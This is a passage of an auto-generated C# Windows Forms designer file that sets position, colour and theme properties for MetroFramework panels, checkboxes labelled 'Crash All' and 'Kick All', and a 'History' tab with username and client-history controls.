            this.CrashAllx.UseStyleColors = true;
            this.CrashAllx.UseVisualStyleBackColor = true;
            // 
            // KickAllx
            // 
            this.KickAllx.AutoSize = true;
            this.KickAllx.ForeColor = System.Drawing.Color.LightSeaGreen;
            this.KickAllx.Location = new System.Drawing.Point(528, 313);
            this.KickAllx.Name = "KickAllx";
            this.KickAllx.Size = new System.Drawing.Size(62, 15);
            this.KickAllx.Style = MetroFramework.MetroColorStyle.Teal;
            this.KickAllx.TabIndex = 54;
            this.KickAllx.Text = "Kick All";
            this.KickAllx.Theme = MetroFramework.MetroThemeStyle.Dark;
            this.KickAllx.UseStyleColors = true;
            this.KickAllx.UseVisualStyleBackColor = true;
            // 
            // metroPanel42
            // 
            this.metroPanel42.BackColor = System.Drawing.Color.LightSeaGreen;
            this.metroPanel42.CustomBackground = true;
            this.metroPanel42.HorizontalScrollbarBarColor = true;
            this.metroPanel42.HorizontalScrollbarHighlightOnWheel = false;
            this.metroPanel42.HorizontalScrollbarSize = 10;
            this.metroPanel42.Location = new System.Drawing.Point(2, 281);
            this.metroPanel42.Name = "metroPanel42";
            this.metroPanel42.Size = new System.Drawing.Size(954, 2);
            this.metroPanel42.Style = MetroFramework.MetroColorStyle.Teal;
            this.metroPanel42.TabIndex = 52;
            this.metroPanel42.Theme = MetroFramework.MetroThemeStyle.Dark;
            this.metroPanel42.VerticalScrollbarBarColor = true;
            this.metroPanel42.VerticalScrollbarHighlightOnWheel = false;
            this.metroPanel42.VerticalScrollbarSize = 10;
            // 
            // metroPanel41
            // 
            this.metroPanel41.BackColor = System.Drawing.Color.LightSeaGreen;
            this.metroPanel41.CustomBackground = true;
            this.metroPanel41.HorizontalScrollbarBarColor = true;
            this.metroPanel41.HorizontalScrollbarHighlightOnWheel = false;
            this.metroPanel41.HorizontalScrollbarSize = 10;
            this.metroPanel41.Location = new System.Drawing.Point(2, 260);
            this.metroPanel41.Name = "metroPanel41";
            this.metroPanel41.Size = new System.Drawing.Size(954, 2);
            this.metroPanel41.Style = MetroFramework.MetroColorStyle.Teal;
            this.metroPanel41.TabIndex = 51;
            this.metroPanel41.Theme = MetroFramework.MetroThemeStyle.Dark;
            this.metroPanel41.VerticalScrollbarBarColor = true;
            this.metroPanel41.VerticalScrollbarHighlightOnWheel = false;
            this.metroPanel41.VerticalScrollbarSize = 10;
            // 
            // metroPanel40
            // 
            this.metroPanel40.BackColor = System.Drawing.Color.LightSeaGreen;
            this.metroPanel40.CustomBackground = true;
            this.metroPanel40.HorizontalScrollbarBarColor = true;
            this.metroPanel40.HorizontalScrollbarHighlightOnWheel = false;
            this.metroPanel40.HorizontalScrollbarSize = 10;
            this.metroPanel40.Location = new System.Drawing.Point(2, 239);
            this.metroPanel40.Name = "metroPanel40";
            this.metroPanel40.Size = new System.Drawing.Size(954, 2);
            this.metroPanel40.Style = MetroFramework.MetroColorStyle.Teal;
            this.metroPanel40.TabIndex = 50;
            this.metroPanel40.Theme = MetroFramework.MetroThemeStyle.Dark;
            this.metroPanel40.VerticalScrollbarBarColor = true;
            this.metroPanel40.VerticalScrollbarHighlightOnWheel = false;
            this.metroPanel40.VerticalScrollbarSize = 10;
            // 
            // metroPanel39
            // 
            this.metroPanel39.BackColor = System.Drawing.Color.LightSeaGreen;
            this.metroPanel39.CustomBackground = true;
            this.metroPanel39.HorizontalScrollbarBarColor = true;
            this.metroPanel39.HorizontalScrollbarHighlightOnWheel = false;
            this.metroPanel39.HorizontalScrollbarSize = 10;
            this.metroPanel39.Location = new System.Drawing.Point(2, 218);
            this.metroPanel39.Name = "metroPanel39";
            this.metroPanel39.Size = new System.Drawing.Size(954, 2);
            this.metroPanel39.Style = MetroFramework.MetroColorStyle.Teal;
            this.metroPanel39.TabIndex = 49;
            this.metroPanel39.Theme = MetroFramework.MetroThemeStyle.Dark;
            this.metroPanel39.VerticalScrollbarBarColor = true;
            this.metroPanel39.VerticalScrollbarHighlightOnWheel = false;
            this.metroPanel39.VerticalScrollbarSize = 10;
            // 
            // metroPanel38
            // 
            this.metroPanel38.BackColor = System.Drawing.Color.LightSeaGreen;
            this.metroPanel38.CustomBackground = true;
            this.metroPanel38.HorizontalScrollbarBarColor = true;
            this.metroPanel38.HorizontalScrollbarHighlightOnWheel = false;
            this.metroPanel38.HorizontalScrollbarSize = 10;
            this.metroPanel38.Location = new System.Drawing.Point(2, 197);
            this.metroPanel38.Name = "metroPanel38";
            this.metroPanel38.Size = new System.Drawing.Size(954, 2);
            this.metroPanel38.Style = MetroFramework.MetroColorStyle.Teal;
            this.metroPanel38.TabIndex = 48;
            this.metroPanel38.Theme = MetroFramework.MetroThemeStyle.Dark;
            this.metroPanel38.VerticalScrollbarBarColor = true;
            this.metroPanel38.VerticalScrollbarHighlightOnWheel = false;
            this.metroPanel38.VerticalScrollbarSize = 10;
            // 
            // metroPanel37
            // 
            this.metroPanel37.BackColor = System.Drawing.Color.LightSeaGreen;
            this.metroPanel37.CustomBackground = true;
            this.metroPanel37.HorizontalScrollbarBarColor = true;
            this.metroPanel37.HorizontalScrollbarHighlightOnWheel = false;
            this.metroPanel37.HorizontalScrollbarSize = 10;
            this.metroPanel37.Location = new System.Drawing.Point(2, 176);
            this.metroPanel37.Name = "metroPanel37";
            this.metroPanel37.Size = new System.Drawing.Size(954, 2);
            this.metroPanel37.Style = MetroFramework.MetroColorStyle.Teal;
            this.metroPanel37.TabIndex = 47;
            this.metroPanel37.Theme = MetroFramework.MetroThemeStyle.Dark;
            this.metroPanel37.VerticalScrollbarBarColor = true;
            this.metroPanel37.VerticalScrollbarHighlightOnWheel = false;
            this.metroPanel37.VerticalScrollbarSize = 10;
            // 
            // metroPanel36
            // 
            this.metroPanel36.BackColor = System.Drawing.Color.LightSeaGreen;
            this.metroPanel36.CustomBackground = true;
            this.metroPanel36.HorizontalScrollbarBarColor = true;
            this.metroPanel36.HorizontalScrollbarHighlightOnWheel = false;
            this.metroPanel36.HorizontalScrollbarSize = 10;
            this.metroPanel36.Location = new System.Drawing.Point(2, 155);
            this.metroPanel36.Name = "metroPanel36";
            this.metroPanel36.Size = new System.Drawing.Size(954, 2);
            this.metroPanel36.Style = MetroFramework.MetroColorStyle.Teal;
            this.metroPanel36.TabIndex = 46;
            this.metroPanel36.Theme = MetroFramework.MetroThemeStyle.Dark;
            this.metroPanel36.VerticalScrollbarBarColor = true;
            this.metroPanel36.VerticalScrollbarHighlightOnWheel = false;
            this.metroPanel36.VerticalScrollbarSize = 10;
            // 
            // metroPanel35
            // 
            this.metroPanel35.BackColor = System.Drawing.Color.LightSeaGreen;
            this.metroPanel35.CustomBackground = true;
            this.metroPanel35.HorizontalScrollbarBarColor = true;
            this.metroPanel35.HorizontalScrollbarHighlightOnWheel = false;
            this.metroPanel35.HorizontalScrollbarSize = 10;
            this.metroPanel35.Location = new System.Drawing.Point(2, 134);
            this.metroPanel35.Name = "metroPanel35";
            this.metroPanel35.Size = new System.Drawing.Size(954, 2);
            this.metroPanel35.Style = MetroFramework.MetroColorStyle.Teal;
            this.metroPanel35.TabIndex = 45;
            this.metroPanel35.Theme = MetroFramework.MetroThemeStyle.Dark;
            this.metroPanel35.VerticalScrollbarBarColor = true;
            this.metroPanel35.VerticalScrollbarHighlightOnWheel = false;
            this.metroPanel35.VerticalScrollbarSize = 10;
            // 
            // metroPanel34
            // 
            this.metroPanel34.BackColor = System.Drawing.Color.LightSeaGreen;
            this.metroPanel34.CustomBackground = true;
            this.metroPanel34.HorizontalScrollbarBarColor = true;
            this.metroPanel34.HorizontalScrollbarHighlightOnWheel = false;
            this.metroPanel34.HorizontalScrollbarSize = 10;
            this.metroPanel34.Location = new System.Drawing.Point(2, 113);
            this.metroPanel34.Name = "metroPanel34";
            this.metroPanel34.Size = new System.Drawing.Size(954, 2);
            this.metroPanel34.Style = MetroFramework.MetroColorStyle.Teal;
            this.metroPanel34.TabIndex = 44;
            this.metroPanel34.Theme = MetroFramework.MetroThemeStyle.Dark;
            this.metroPanel34.VerticalScrollbarBarColor = true;
            this.metroPanel34.VerticalScrollbarHighlightOnWheel = false;
            this.metroPanel34.VerticalScrollbarSize = 10;
            // 
            // metroPanel33
            // 
            this.metroPanel33.BackColor = System.Drawing.Color.LightSeaGreen;
            this.metroPanel33.CustomBackground = true;
            this.metroPanel33.HorizontalScrollbarBarColor = true;
            this.metroPanel33.HorizontalScrollbarHighlightOnWheel = false;
            this.metroPanel33.HorizontalScrollbarSize = 10;
            this.metroPanel33.Location = new System.Drawing.Point(2, 92);
            this.metroPanel33.Name = "metroPanel33";
            this.metroPanel33.Size = new System.Drawing.Size(954, 2);
            this.metroPanel33.Style = MetroFramework.MetroColorStyle.Teal;
            this.metroPanel33.TabIndex = 43;
            this.metroPanel33.Theme = MetroFramework.MetroThemeStyle.Dark;
            this.metroPanel33.VerticalScrollbarBarColor = true;
            this.metroPanel33.VerticalScrollbarHighlightOnWheel = false;
            this.metroPanel33.VerticalScrollbarSize = 10;
            // 
            // metroPanel32
            // 
            this.metroPanel32.BackColor = System.Drawing.Color.LightSeaGreen;
            this.metroPanel32.CustomBackground = true;
            this.metroPanel32.HorizontalScrollbarBarColor = true;
            this.metroPanel32.HorizontalScrollbarHighlightOnWheel = false;
            this.metroPanel32.HorizontalScrollbarSize = 10;
            this.metroPanel32.Location = new System.Drawing.Point(2, 71);
            this.metroPanel32.Name = "metroPanel32";
            this.metroPanel32.Size = new System.Drawing.Size(954, 2);
            this.metroPanel32.Style = MetroFramework.MetroColorStyle.Teal;
            this.metroPanel32.TabIndex = 42;
            this.metroPanel32.Theme = MetroFramework.MetroThemeStyle.Dark;
            this.metroPanel32.VerticalScrollbarBarColor = true;
            this.metroPanel32.VerticalScrollbarHighlightOnWheel = false;
            this.metroPanel32.VerticalScrollbarSize = 10;
            // 
            // metroPanel31
            // 
            this.metroPanel31.BackColor = System.Drawing.Color.LightSeaGreen;
            this.metroPanel31.CustomBackground = true;
            this.metroPanel31.HorizontalScrollbarBarColor = true;
            this.metroPanel31.HorizontalScrollbarHighlightOnWheel = false;
            this.metroPanel31.HorizontalScrollbarSize = 10;
            this.metroPanel31.Location = new System.Drawing.Point(2, 50);
            this.metroPanel31.Name = "metroPanel31";
            this.metroPanel31.Size = new System.Drawing.Size(954, 2);
            this.metroPanel31.Style = MetroFramework.MetroColorStyle.Teal;
            this.metroPanel31.TabIndex = 41;
            this.metroPanel31.Theme = MetroFramework.MetroThemeStyle.Dark;
            this.metroPanel31.VerticalScrollbarBarColor = true;
            this.metroPanel31.VerticalScrollbarHighlightOnWheel = false;
            this.metroPanel31.VerticalScrollbarSize = 10;
            // 
            // metroPanel30
            // 
            this.metroPanel30.BackColor = System.Drawing.Color.LightSeaGreen;
            this.metroPanel30.CustomBackground = true;
            this.metroPanel30.HorizontalScrollbarBarColor = true;
            this.metroPanel30.HorizontalScrollbarHighlightOnWheel = false;
            this.metroPanel30.HorizontalScrollbarSize = 10;
            this.metroPanel30.Location = new System.Drawing.Point(2, 29);
            this.metroPanel30.Name = "metroPanel30";
            this.metroPanel30.Size = new System.Drawing.Size(954, 2);
            this.metroPanel30.Style = MetroFramework.MetroColorStyle.Teal;
            this.metroPanel30.TabIndex = 40;
            this.metroPanel30.Theme = MetroFramework.MetroThemeStyle.Dark;
            this.metroPanel30.VerticalScrollbarBarColor = true;
            this.metroPanel30.VerticalScrollbarHighlightOnWheel = false;
            this.metroPanel30.VerticalScrollbarSize = 10;
            // 
            // metroPanel29
            // 
            this.metroPanel29.BackColor = System.Drawing.Color.LightSeaGreen;
            this.metroPanel29.CustomBackground = true;
            this.metroPanel29.HorizontalScrollbarBarColor = true;
            this.metroPanel29.HorizontalScrollbarHighlightOnWheel = false;
            this.metroPanel29.HorizontalScrollbarSize = 10;
            this.metroPanel29.Location = new System.Drawing.Point(954, 13);
            this.metroPanel29.Name = "metroPanel29";
            this.metroPanel29.Size = new System.Drawing.Size(2, 289);
            this.metroPanel29.Style = MetroFramework.MetroColorStyle.Teal;
            this.metroPanel29.TabIndex = 39;
            this.metroPanel29.Theme = MetroFramework.MetroThemeStyle.Dark;
            this.metroPanel29.VerticalScrollbarBarColor = true;
            this.metroPanel29.VerticalScrollbarHighlightOnWheel = false;
            this.metroPanel29.VerticalScrollbarSize = 10;
            // 
            // metroPanel28
            // 
            this.metroPanel28.BackColor = System.Drawing.Color.LightSeaGreen;
            this.metroPanel28.CustomBackground = true;
            this.metroPanel28.HorizontalScrollbarBarColor = true;
            this.metroPanel28.HorizontalScrollbarHighlightOnWheel = false;
            this.metroPanel28.HorizontalScrollbarSize = 10;
            this.metroPanel28.Location = new System.Drawing.Point(769, 14);
            this.metroPanel28.Name = "metroPanel28";
            this.metroPanel28.Size = new System.Drawing.Size(2, 289);
            this.metroPanel28.Style = MetroFramework.MetroColorStyle.Teal;
            this.metroPanel28.TabIndex = 38;
            this.metroPanel28.Theme = MetroFramework.MetroThemeStyle.Dark;
            this.metroPanel28.VerticalScrollbarBarColor = true;
            this.metroPanel28.VerticalScrollbarHighlightOnWheel = false;
            this.metroPanel28.VerticalScrollbarSize = 10;
            // 
            // metroPanel27
            // 
            this.metroPanel27.BackColor = System.Drawing.Color.LightSeaGreen;
            this.metroPanel27.CustomBackground = true;
            this.metroPanel27.HorizontalScrollbarBarColor = true;
            this.metroPanel27.HorizontalScrollbarHighlightOnWheel = false;
            this.metroPanel27.HorizontalScrollbarSize = 10;
            this.metroPanel27.Location = new System.Drawing.Point(697, 13);
            this.metroPanel27.Name = "metroPanel27";
            this.metroPanel27.Size = new System.Drawing.Size(2, 289);
            this.metroPanel27.Style = MetroFramework.MetroColorStyle.Teal;
            this.metroPanel27.TabIndex = 37;
            this.metroPanel27.Theme = MetroFramework.MetroThemeStyle.Dark;
            this.metroPanel27.VerticalScrollbarBarColor = true;
            this.metroPanel27.VerticalScrollbarHighlightOnWheel = false;
            this.metroPanel27.VerticalScrollbarSize = 10;
            // 
            // metroPanel26
            // 
            this.metroPanel26.BackColor = System.Drawing.Color.LightSeaGreen;
            this.metroPanel26.CustomBackground = true;
            this.metroPanel26.HorizontalScrollbarBarColor = true;
            this.metroPanel26.HorizontalScrollbarHighlightOnWheel = false;
            this.metroPanel26.HorizontalScrollbarSize = 10;
            this.metroPanel26.Location = new System.Drawing.Point(647, 14);
            this.metroPanel26.Name = "metroPanel26";
            this.metroPanel26.Size = new System.Drawing.Size(2, 289);
            this.metroPanel26.Style = MetroFramework.MetroColorStyle.Teal;
            this.metroPanel26.TabIndex = 36;
            this.metroPanel26.Theme = MetroFramework.MetroThemeStyle.Dark;
            this.metroPanel26.VerticalScrollbarBarColor = true;
            this.metroPanel26.VerticalScrollbarHighlightOnWheel = false;
            this.metroPanel26.VerticalScrollbarSize = 10;
            // 
            // metroPanel25
            // 
            this.metroPanel25.BackColor = System.Drawing.Color.LightSeaGreen;
            this.metroPanel25.CustomBackground = true;
            this.metroPanel25.HorizontalScrollbarBarColor = true;
            this.metroPanel25.HorizontalScrollbarHighlightOnWheel = false;
            this.metroPanel25.HorizontalScrollbarSize = 10;
            this.metroPanel25.Location = new System.Drawing.Point(547, 13);
            this.metroPanel25.Name = "metroPanel25";
            this.metroPanel25.Size = new System.Drawing.Size(2, 289);
            this.metroPanel25.Style = MetroFramework.MetroColorStyle.Teal;
            this.metroPanel25.TabIndex = 35;
            this.metroPanel25.Theme = MetroFramework.MetroThemeStyle.Dark;
            this.metroPanel25.VerticalScrollbarBarColor = true;
            this.metroPanel25.VerticalScrollbarHighlightOnWheel = false;
            this.metroPanel25.VerticalScrollbarSize = 10;
            // 
            // metroPanel24
            // 
            this.metroPanel24.BackColor = System.Drawing.Color.LightSeaGreen;
            this.metroPanel24.CustomBackground = true;
            this.metroPanel24.HorizontalScrollbarBarColor = true;
            this.metroPanel24.HorizontalScrollbarHighlightOnWheel = false;
            this.metroPanel24.HorizontalScrollbarSize = 10;
            this.metroPanel24.Location = new System.Drawing.Point(347, 13);
            this.metroPanel24.Name = "metroPanel24";
            this.metroPanel24.Size = new System.Drawing.Size(2, 289);
            this.metroPanel24.Style = MetroFramework.MetroColorStyle.Teal;
            this.metroPanel24.TabIndex = 34;
            this.metroPanel24.Theme = MetroFramework.MetroThemeStyle.Dark;
            this.metroPanel24.VerticalScrollbarBarColor = true;
            this.metroPanel24.VerticalScrollbarHighlightOnWheel = false;
            this.metroPanel24.VerticalScrollbarSize = 10;
            // 
            // metroPanel23
            // 
            this.metroPanel23.BackColor = System.Drawing.Color.LightSeaGreen;
            this.metroPanel23.CustomBackground = true;
            this.metroPanel23.HorizontalScrollbarBarColor = true;
            this.metroPanel23.HorizontalScrollbarHighlightOnWheel = false;
            this.metroPanel23.HorizontalScrollbarSize = 10;
            this.metroPanel23.Location = new System.Drawing.Point(969, 13);
            this.metroPanel23.Name = "metroPanel23";
            this.metroPanel23.Size = new System.Drawing.Size(2, 289);
            this.metroPanel23.Style = MetroFramework.MetroColorStyle.Teal;
            this.metroPanel23.TabIndex = 33;
            this.metroPanel23.Theme = MetroFramework.MetroThemeStyle.Dark;
            this.metroPanel23.VerticalScrollbarBarColor = true;
            this.metroPanel23.VerticalScrollbarHighlightOnWheel = false;
            this.metroPanel23.VerticalScrollbarSize = 10;
            // 
            // metroPanel22
            // 
            this.metroPanel22.BackColor = System.Drawing.Color.LightSeaGreen;
            this.metroPanel22.CustomBackground = true;
            this.metroPanel22.HorizontalScrollbarBarColor = true;
            this.metroPanel22.HorizontalScrollbarHighlightOnWheel = false;
            this.metroPanel22.HorizontalScrollbarSize = 10;
            this.metroPanel22.Location = new System.Drawing.Point(197, 14);
            this.metroPanel22.Name = "metroPanel22";
            this.metroPanel22.Size = new System.Drawing.Size(2, 289);
            this.metroPanel22.Style = MetroFramework.MetroColorStyle.Teal;
            this.metroPanel22.TabIndex = 32;
            this.metroPanel22.Theme = MetroFramework.MetroThemeStyle.Dark;
            this.metroPanel22.VerticalScrollbarBarColor = true;
            this.metroPanel22.VerticalScrollbarHighlightOnWheel = false;
            this.metroPanel22.VerticalScrollbarSize = 10;
            // 
            // metroPanel21
            // 
            this.metroPanel21.BackColor = System.Drawing.Color.LightSeaGreen;
            this.metroPanel21.CustomBackground = true;
            this.metroPanel21.HorizontalScrollbarBarColor = true;
            this.metroPanel21.HorizontalScrollbarHighlightOnWheel = false;
            this.metroPanel21.HorizontalScrollbarSize = 10;
            this.metroPanel21.Location = new System.Drawing.Point(158, 13);
            this.metroPanel21.Name = "metroPanel21";
            this.metroPanel21.Size = new System.Drawing.Size(2, 289);
            this.metroPanel21.Style = MetroFramework.MetroColorStyle.Teal;
            this.metroPanel21.TabIndex = 31;
            this.metroPanel21.Theme = MetroFramework.MetroThemeStyle.Dark;
            this.metroPanel21.VerticalScrollbarBarColor = true;
            this.metroPanel21.VerticalScrollbarHighlightOnWheel = false;
            this.metroPanel21.VerticalScrollbarSize = 10;
            // 
            // metroPanel20
            // 
            this.metroPanel20.BackColor = System.Drawing.Color.LightSeaGreen;
            this.metroPanel20.CustomBackground = true;
            this.metroPanel20.HorizontalScrollbarBarColor = true;
            this.metroPanel20.HorizontalScrollbarHighlightOnWheel = false;
            this.metroPanel20.HorizontalScrollbarSize = 10;
            this.metroPanel20.Location = new System.Drawing.Point(2, 302);
            this.metroPanel20.Name = "metroPanel20";
            this.metroPanel20.Size = new System.Drawing.Size(954, 2);
            this.metroPanel20.Style = MetroFramework.MetroColorStyle.Teal;
            this.metroPanel20.TabIndex = 30;
            this.metroPanel20.Theme = MetroFramework.MetroThemeStyle.Dark;
            this.metroPanel20.VerticalScrollbarBarColor = true;
            this.metroPanel20.VerticalScrollbarHighlightOnWheel = false;
            this.metroPanel20.VerticalScrollbarSize = 10;
            // 
            // metroPanel19
            // 
            this.metroPanel19.BackColor = System.Drawing.Color.LightSeaGreen;
            this.metroPanel19.CustomBackground = true;
            this.metroPanel19.HorizontalScrollbarBarColor = true;
            this.metroPanel19.HorizontalScrollbarHighlightOnWheel = false;
            this.metroPanel19.HorizontalScrollbarSize = 10;
            this.metroPanel19.Location = new System.Drawing.Point(2, 14);
            this.metroPanel19.Name = "metroPanel19";
            this.metroPanel19.Size = new System.Drawing.Size(2, 288);
            this.metroPanel19.Style = MetroFramework.MetroColorStyle.Teal;
            this.metroPanel19.TabIndex = 29;
            this.metroPanel19.Theme = MetroFramework.MetroThemeStyle.Dark;
            this.metroPanel19.VerticalScrollbarBarColor = true;
            this.metroPanel19.VerticalScrollbarHighlightOnWheel = false;
            this.metroPanel19.VerticalScrollbarSize = 10;
            // 
            // metroTabPage3
            // 
            this.metroTabPage3.Controls.Add(this.label4);
            this.metroTabPage3.Controls.Add(this.metroPanel60);
            this.metroTabPage3.Controls.Add(this.metroPanel59);
            this.metroTabPage3.Controls.Add(this.metroPanel58);
            this.metroTabPage3.Controls.Add(this.metroPanel57);
            this.metroTabPage3.Controls.Add(this.metroPanel56);
            this.metroTabPage3.Controls.Add(this.metroPanel55);
            this.metroTabPage3.Controls.Add(this.metroPanel54);
            this.metroTabPage3.Controls.Add(this.metroPanel53);
            this.metroTabPage3.Controls.Add(this.metroPanel52);
            this.metroTabPage3.Controls.Add(this.metroPanel51);
            this.metroTabPage3.Controls.Add(this.metroPanel50);
            this.metroTabPage3.Controls.Add(this.metroPanel49);
            this.metroTabPage3.Controls.Add(this.metroPanel48);
            this.metroTabPage3.Controls.Add(this.metroPanel47);
            this.metroTabPage3.Controls.Add(this.metroPanel46);
            this.metroTabPage3.Controls.Add(this.metroPanel45);
            this.metroTabPage3.Controls.Add(this.metroPanel44);
            this.metroTabPage3.Controls.Add(this.metroPanel43);
            this.metroTabPage3.Controls.Add(this.TextBoxUsername);
            this.metroTabPage3.Controls.Add(this.ClientHistory);
            this.metroTabPage3.Controls.Add(this.LabelUsername);
            this.metroTabPage3.Enabled = true;
            this.metroTabPage3.HorizontalScrollbarBarColor = true;
            this.metroTabPage3.Location = new System.Drawing.Point(4, 38);
            this.metroTabPage3.Name = "metroTabPage3";
            this.metroTabPage3.Size = new System.Drawing.Size(969, 372);
            this.metroTabPage3.Style = MetroFramework.MetroColorStyle.Teal;
            this.metroTabPage3.TabIndex = 2;
            this.metroTabPage3.Text = "      History";
            this.metroTabPage3.Theme = MetroFramework.MetroThemeStyle.Dark;
            this.metroTabPage3.VerticalScrollbarBarColor = true;
            this.metroTabPage3.VerticalScrollbarSize = 5;
            this.metroTabPage3.Visible = false;
            // 
            // label4
            // 
            this.label4.BackColor = System.Drawing.Color.LightSeaGreen;
            this.label4.Font = new System.Drawing.Font("Segoe UI", 8.25F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.label4.Location = new System.Drawing.Point(203, 3);
            this.label4.Name = "label4";
            this.label4.Size = new System.Drawing.Size(567, 13);
            this.label4.TabIndex = 19;
            this.label4.Text = "   Database";
            this.label4.TextAlign = System.Drawing.ContentAlignment.MiddleCenter;
            // 
            // metroPanel60
            // 
            this.metroPanel60.BackColor = System.Drawing.Color.LightSeaGreen;
            this.metroPanel60.CustomBackground = true;
            this.metroPanel60.HorizontalScrollbarBarColor = true;
            this.metroPanel60.HorizontalScrollbarHighlightOnWheel = false;
            this.metroPanel60.HorizontalScrollbarSize = 10;
            this.metroPanel60.Location = new System.Drawing.Point(203, 262);
            this.metroPanel60.Name = "metroPanel60";
            this.metroPanel60.Size = new System.Drawing.Size(567, 2);
            this.metroPanel60.Style = MetroFramework.MetroColorStyle.Teal;
            this.metroPanel60.TabIndex = 57;
            this.metroPanel60.Theme = MetroFramework.MetroThemeStyle.Dark;
            this.metroPanel60.VerticalScrollbarBarColor = true;
            this.metroPanel60.VerticalScrollbarHighlightOnWheel = false;
            this.metroPanel60.VerticalScrollbarSize = 10;
            // 
            // metroPanel59
            // 
            this.metroPanel59.BackColor = System.Drawing.Color.LightSeaGreen;
            this.metroPanel59.CustomBackground = true;
            this.metroPanel59.HorizontalScrollbarBarColor = true;
            this.metroPanel59.HorizontalScrollbarHighlightOnWheel = false;
            this.metroPanel59.HorizontalScrollbarSize = 10;
            this.metroPanel59.Location = new System.Drawing.Point(203, 241);
            this.metroPanel59.Name = "metroPanel59";
            this.metroPanel59.Size = new System.Drawing.Size(567, 2);
            this.metroPanel59.Style = MetroFramework.MetroColorStyle.Teal;
            this.metroPanel59.TabIndex = 56;
            this.metroPanel59.Theme = MetroFramework.MetroThemeStyle.Dark;
            this.metroPanel59.VerticalScrollbarBarColor = true;
            this.metroPanel59.VerticalScrollbarHighlightOnWheel = false;
            this.metroPanel59.VerticalScrollbarSize = 10;
            // 
            // metroPanel58
            // 
            this.metroPanel58.BackColor = System.Drawing.Color.LightSeaGreen;
            this.metroPanel58.CustomBackground = true;
            this.metroPanel58.HorizontalScrollbarBarColor = true;
            this.metroPanel58.HorizontalScrollbarHighlightOnWheel = false;
            this.metroPanel58.HorizontalScrollbarSize = 10;
            this.metroPanel58.Location = new System.Drawing.Point(203, 220);
            this.metroPanel58.Name = "metroPanel58";
            this.metroPanel58.Size = new System.Drawing.Size(567, 2);
            this.metroPanel58.Style = MetroFramework.MetroColorStyle.Teal;
            this.metroPanel58.TabIndex = 55;
            this.metroPanel58.Theme = MetroFramework.MetroThemeStyle.Dark;
            this.metroPanel58.VerticalScrollbarBarColor = true;
            this.metroPanel58.VerticalScrollbarHighlightOnWheel = false;
            this.metroPanel58.VerticalScrollbarSize = 10;
            // 
            // metroPanel57
            // 
            this.metroPanel57.BackColor = System.Drawing.Color.LightSeaGreen;
            this.metroPanel57.CustomBackground = true;
            this.metroPanel57.HorizontalScrollbarBarColor = true;
            this.metroPanel57.HorizontalScrollbarHighlightOnWheel = false;
            this.metroPanel57.HorizontalScrollbarSize = 10;
            this.metroPanel57.Location = new System.Drawing.Point(203, 199);
            this.metroPanel57.Name = "metroPanel57";
            this.metroPanel57.Size = new System.Drawing.Size(567, 2);
            this.metroPanel57.Style = MetroFramework.MetroColorStyle.Teal;
            this.metroPanel57.TabIndex = 54;
            this.metroPanel57.Theme = MetroFramework.MetroThemeStyle.Dark;
            this.metroPanel57.VerticalScrollbarBarColor = true;
            this.metroPanel57.VerticalScrollbarHighlightOnWheel = false;
            this.metroPanel57.VerticalScrollbarSize = 10;
            // 
            // metroPanel56
            // 
            this.metroPanel56.BackColor = System.Drawing.Color.LightSeaGreen;
            this.metroPanel56.CustomBackground = true;
            this.metroPanel56.HorizontalScrollbarBarColor = true;
            this.metroPanel56.HorizontalScrollbarHighlightOnWheel = false;
            this.metroPanel56.HorizontalScrollbarSize = 10;
            this.metroPanel56.Location = new System.Drawing.Point(203, 178);
            this.metroPanel56.Name = "metroPanel56";
            this.metroPanel56.Size = new System.Drawing.Size(567, 2);
            this.metroPanel56.Style = MetroFramework.MetroColorStyle.Teal;
            this.metroPanel56.TabIndex = 53;
            this.metroPanel56.Theme = MetroFramework.MetroThemeStyle.Dark;
            this.metroPanel56.VerticalScrollbarBarColor = true;
            this.metroPanel56.VerticalScrollbarHighlightOnWheel = false;
            this.metroPanel56.VerticalScrollbarSize = 10;
            // 
            // metroPanel55
            // 
            this.metroPanel55.BackColor = System.Drawing.Color.LightSeaGreen;
            this.metroPanel55.CustomBackground = true;
            this.metroPanel55.HorizontalScrollbarBarColor = true;
            this.metroPanel55.HorizontalScrollbarHighlightOnWheel = false;
            this.metroPanel55.HorizontalScrollbarSize = 10;
            this.metroPanel55.Location = new System.Drawing.Point(203, 157);
            this.metroPanel55.Name = "metroPanel55";
            this.metroPanel55.Size = new System.Drawing.Size(567, 2);
            this.metroPanel55.Style = MetroFramework.MetroColorStyle.Teal;
            this.metroPanel55.TabIndex = 52;
            this.metroPanel55.Theme = MetroFramework.MetroThemeStyle.Dark;
            this.metroPanel55.VerticalScrollbarBarColor = true;
            this.metroPanel55.VerticalScrollbarHighlightOnWheel = false;
            this.metroPanel55.VerticalScrollbarSize = 10;
            // 
            // metroPanel54
            // 
            this.metroPanel54.BackColor = System.Drawing.Color.LightSeaGreen;
            this.metroPanel54.CustomBackground = true;
            this.metroPanel54.HorizontalScrollbarBarColor = true;
            this.metroPanel54.HorizontalScrollbarHighlightOnWheel = false;
            this.metroPanel54.HorizontalScrollbarSize = 10;
            this.metroPanel54.Location = new System.Drawing.Point(203, 136);
            this.metroPanel54.Name = "metroPanel54";
            this.metroPanel54.Size = new System.Drawing.Size(567, 2);
            this.metroPanel54.Style = MetroFramework.MetroColorStyle.Teal;
            this.metroPanel54.TabIndex = 51;
            this.metroPanel54.Theme = MetroFramework.MetroThemeStyle.Dark;
            this.metroPanel54.VerticalScrollbarBarColor = true;
            this.metroPanel54.VerticalScrollbarHighlightOnWheel = false;
            this.metroPanel54.VerticalScrollbarSize = 10;
            // 
            // metroPanel53
            // 
            this.metroPanel53.BackColor = System.Drawing.Color.LightSeaGreen;
            this.metroPanel53.CustomBackground = true;
            this.metroPanel53.HorizontalScrollbarBarColor = true;
            this.metroPanel53.HorizontalScrollbarHighlightOnWheel = false;
            this.metroPanel53.HorizontalScrollbarSize = 10;
            this.metroPanel53.Location = new System.Drawing.Point(203, 115);
            this.metroPanel53.Name = "metroPanel53";
            this.metroPanel53.Size = new System.Drawing.Size(567, 2);
            this.metroPanel53.Style = MetroFramework.MetroColorStyle.Teal;
            this.metroPanel53.TabIndex = 50;
            this.metroPanel53.Theme = MetroFramework.MetroThemeStyle.Dark;
            this.metroPanel53.VerticalScrollbarBarColor = true;
            this.metroPanel53.VerticalScrollbarHighlightOnWheel = false;
            this.metroPanel53.VerticalScrollbarSize = 10;
            // 
            // metroPanel52
            // 
            this.metroPanel52.BackColor = System.Drawing.Color.LightSeaGreen;
            this.metroPanel52.CustomBackground = true;
            this.metroPanel52.HorizontalScrollbarBarColor = true;
